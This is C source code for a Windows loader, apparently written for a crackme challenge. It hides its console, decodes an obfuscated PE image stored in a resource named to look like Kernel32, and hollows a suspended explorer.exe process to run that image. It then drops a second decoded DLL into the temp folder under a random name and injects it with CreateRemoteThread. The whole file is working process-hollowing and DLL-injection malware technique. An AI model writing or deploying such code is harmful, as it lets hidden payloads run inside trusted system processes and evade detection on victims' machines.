#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <time.h>
#include <winternl.h>
// uncomment to make it print errors
//#define DEBUG
#define MYERR while(1){ printf("ERROR! %d\n",GetLastError());Sleep(1000);break;}
#define SIZE_EXE 1134592
CONTEXT ctx;
typedef __int64 QWORD;

typedef LONG( WINAPI * NtUnmapViewOfSection )(HANDLE ProcessHandle, PVOID BaseAddress);
NtUnmapViewOfSection NtUnmapViewOfSection_fun;
char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
char blob[] = "\x01\x02\x01\x01\x01\x01\x01\x01\x00\x01\x01\x01\x01\x01\x01\x01\x01";

VOID rand_string(LPSTR s, int size)
{
	for (int i = 0; i < size; i++)
		s[i] = charset[rand() % 62];
}

PVOID loadfile(LPCSTR path)
{
	PVOID mem = malloc(SIZE_EXE);
	LARGE_INTEGER fsize;
	FILE* f = fopen(path, "rb");
	fread(mem, 1, SIZE_EXE, f);
	return mem;
}

DWORD load_res(LPCSTR res_id, PVOID* out)
{
	HRSRC res = FindResourceA(NULL, res_id, MAKEINTRESOURCE(10));
	*out = LoadResource(NULL, res);
	return SizeofResource(NULL, res);
}

DWORD load_stage(PVOID res)
{
	return load_res("Kerne132", res);
}

DWORD load_dll(PVOID res)
{
	return load_res("Kernel32", res);
}

VOID hide_console()
{
	HWND hConsole = GetConsoleWindow();
	ShowWindow( hConsole, SW_MINIMIZE );
    ShowWindow( hConsole, SW_HIDE );
}

int main(int argc, char* argv[], char* envp[])
{
	char dll_filename[64];
	hide_console();
	srand(time(NULL));
	PEB peb;
	STARTUPINFOA startinfo;
	memset(&startinfo, 0, sizeof(startinfo));
	startinfo.cb = sizeof(startinfo);
	PROCESS_INFORMATION processinfo;
	memset(&processinfo, 0, sizeof(processinfo));	
	if (!CreateProcess(/*"C:\\Windows\\System32\\calc.exe"*/"C:\\Windows\\explorer.exe", "", NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &startinfo, &processinfo))
	{
#ifdef DEBUG
		printf("[-] CreateProcess\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	//HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processinfo.dwProcessId);
	ctx.ContextFlags = CONTEXT_FULL;
#ifdef DEBUG
	printf("hprocess=%p\n",processinfo.hProcess);
#endif
	if (!GetThreadContext(processinfo.hThread, &ctx))
	{
#ifdef DEBUG
		printf("[-] GetThreadContext\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	PVOID imagebase;
#ifdef DEBUG
	printf("PEB = %p\n", ctx.Rdx);
#endif
	if (!ReadProcessMemory(processinfo.hProcess, (LPCVOID) ctx.Rdx, (LPVOID)&peb, sizeof(peb), NULL))
	{
#ifdef DEBUG
		printf("[-] ReadProcessMemory imagebase\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	imagebase = peb.Reserved3[1];
#ifdef DEBUG
	printf("[+] main module = %p\n", imagebase);
#endif
	NtUnmapViewOfSection_fun = (NtUnmapViewOfSection) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtUnmapViewOfSection");
#ifdef DEBUG
	printf("[+] NtUnmapViewOfSection = %p\n", NtUnmapViewOfSection_fun);
	printf("Imagebase at %p\n", imagebase);
#endif
	LPSTR mem;//loadfile("C:\\Users\\Redouane\\Desktop\\Work\\infosec\\megacrackme\\crackme.exe");
	int size_stage = load_stage(&mem);
	for (int i = 0; i < size_stage; i++)
	{
		mem[i] = (mem[i] + 99) ^ 0x2f;
	}
#ifdef DEBUG
	printf("Loaded stage of size %u\n", size_stage);
#endif
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER) mem;
	PIMAGE_NT_HEADERS64 nt_header = (PIMAGE_NT_HEADERS64) ((__int64)mem + dos_header->e_lfanew);
#ifdef DEBUG
	printf("[?] Number of sections : %d\n", nt_header->FileHeader.NumberOfSections);
#endif
	if (imagebase == nt_header->OptionalHeader.ImageBase)
		if (NtUnmapViewOfSection_fun(processinfo.hProcess, (PVOID)imagebase))
		{
#ifdef DEBUG
		  printf("[-] NtUnmapViewOfSection\n");
		  MYERR;
#endif
		  ExitProcess(1);
		}
#ifdef DEBUG
	printf("sizeof(image) = %p\n", nt_header->OptionalHeader.SizeOfImage);
	printf("? imagebase = %p\n", imagebase);
#endif
	LPVOID new_imagebase = VirtualAllocEx(
		processinfo.hProcess,
		(PVOID)nt_header->OptionalHeader.ImageBase,
		nt_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (new_imagebase == NULL)
	{
#ifdef DEBUG
		printf("[-] VirtualAllocEx imagebase\n");
		MYERR;
#endif
		ExitProcess(1);
	}
#ifdef DEBUG
	printf("[?] new_imagebase = %p\n", new_imagebase);
#endif
	if (!WriteProcessMemory(processinfo.hProcess, new_imagebase, mem, nt_header->OptionalHeader.SizeOfHeaders, NULL))
	{
#ifdef DEBUG
		printf("[-] WriteProcessMemory headers\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++)
	{
		PIMAGE_SECTION_HEADER section_header = (PIMAGE_SECTION_HEADER) ((__int64)mem + dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (i * sizeof(IMAGE_SECTION_HEADER)));
		//printf("[?] section : %s\nVirtualAddress : 0x%x\nRaw size : %x\nPointer to raw data : %p\n", section_header->Name, section_header->VirtualAddress, section_header->SizeOfRawData, section_header->PointerToRawData);
		if (!WriteProcessMemory(processinfo.hProcess, new_imagebase+section_header->VirtualAddress, (LPVOID)((__int64)mem+section_header->PointerToRawData), section_header->SizeOfRawData, NULL))
		{
#ifdef DEBUG
			printf("[-] WriteProcessMemory section\n");
			MYERR;
#endif
			ExitProcess(1);
		}
	}
	if (!WriteProcessMemory(processinfo.hProcess, (LPVOID)ctx.Rdx+0x10, &new_imagebase, 8, NULL))
	{
#ifdef DEBUG
		printf("[-] WriteProcessMemory newimagebase\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	
	ctx.Rcx = /*nt_header->OptionalHeader.ImageBase*/(__int64)new_imagebase + nt_header->OptionalHeader.AddressOfEntryPoint;
    
    if (!SetThreadContext(processinfo.hThread, &ctx))
	{
#ifdef DEBUG
		printf("[-] SetThreadContext\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	
	if (ResumeThread(processinfo.hThread) == -1)
	{
#ifdef DEBUG
		printf("[-] ResumeThread\n");
		MYERR;
#endif
		ExitProcess(1);
	}

	// inject the dll
	char* dll;
	int dll_size = load_dll(&dll);
	
	for (int i = 0; i < dll_size; i++)
	{
		dll[i] = (dll[i] + 0x55) ^ 0xe3;
	}
	//printf("[+] loaded dll of size %u\n", dll_size);
	size_t temp_length = GetTempPathA(sizeof(dll_filename),dll_filename);
	rand_string(dll_filename+temp_length, 5);
	dll_filename[temp_length+5]='.';
	dll_filename[temp_length+6]='d';
	dll_filename[temp_length+7]='l';
	dll_filename[temp_length+8]='l';
	//printf("[?] dll_filename = %s\n", dll_filename);
	OFSTRUCT fileofstruct;
	HANDLE dll_file = CreateFile(dll_filename, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (dll_file == INVALID_HANDLE_VALUE)
	{
#ifdef DEBUG
		printf("[-] CreateFile\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	//printf("dll_file = %p\n", dll_file);
	DWORD written_bytes;
	if (WriteFile(dll_file, dll, dll_size, &written_bytes, NULL) == 0)
	{
#ifdef DEBUG
		printf("[-] WriteFile\n");
		MYERR;
#endif
		ExitProcess(1);
    }
	CloseHandle(dll_file);
	LPVOID dllpath_addr = VirtualAllocEx(processinfo.hProcess, NULL, _MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!WriteProcessMemory(processinfo.hProcess, dllpath_addr, dll_filename, strlen(dll_filename)+1, NULL))
	{
#ifdef DEBUG
		printf("[-] WriteProcessMemory\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	LPVOID loadlibrary_addr = (LPVOID) GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	if (!loadlibrary_addr)
	{
#ifdef DEBUG
		printf("[-] GetProcAddress\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	HANDLE dllloader_handle = CreateRemoteThread(processinfo.hProcess, NULL, 0, loadlibrary_addr, dllpath_addr, 0, NULL);
	
	if (!dllloader_handle)
	{
#ifdef DEBUG
		printf("[-] CreateRemoteThread\n");
		MYERR;
#endif
		ExitProcess(1);
	}
	
	/*
	if (WaitForSingleObject(dllloader_handle, 0) == -1)
	{
		printf("[-] WaitForSingleObject\n");
		MYERR;
		return -1;
	}
	*/
#ifdef DEBUG
	printf("Exiting normally\n");
#endif
	ExitProcess(0);
}
